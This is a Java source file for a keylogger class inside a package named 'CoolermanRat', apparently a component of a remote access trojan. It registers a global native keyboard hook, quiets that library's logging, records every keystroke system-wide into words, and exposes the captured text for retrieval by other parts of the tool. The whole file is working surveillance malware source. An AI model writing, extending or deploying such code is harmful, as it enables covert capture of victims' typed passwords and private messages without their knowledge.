package me.dodeedoo.CoolermanRat;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.sql.Timestamp;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;

public class KeyLogger implements NativeKeyListener {

    private Timestamp then = Timestamp.from(Instant.now());
    private List<Character> word = new ArrayList<>();
    private List<String> typed = new ArrayList<>();

    public void init() {

        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);
        logger.setUseParentHandlers(false);
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.exit(-1);
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        if (keyText.length() > 1) {
            System.out.println("[" + keyText + "]");
        } else {
            Timestamp now = Timestamp.from(Instant.now());
            //System.out.println(now.compareTo(then) + " " + now + " " + then);
            if (compareTimeStamps(now, then) < 4) {
                word.add(keyText.toCharArray()[0]);
            }else{
                StringBuilder finalWord = new StringBuilder();
                word.forEach(finalWord::append);
                System.out.println(finalWord);
                typed.add(finalWord.toString());
                word = new ArrayList<>();
            }

            then = now;

        }

    }

    public List<String> getTyped(Boolean flush) {
        if (flush) {
            List<String> temp = this.typed;
            this.typed = new ArrayList<>();
            return temp;
        }
        return this.typed;
    }

    @SuppressWarnings("deprecation")
    public static Integer compareTimeStamps(Timestamp now, Timestamp then) {
        Integer[] seconds = new Integer[]{now.getSeconds(), then.getSeconds()};
        Integer result;
        if (now.getMinutes() == then.getMinutes()) {
            result = seconds[0] - seconds[1];
        }else{
            result = seconds[1] - seconds[0];
        }
        return result;
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
    }
}
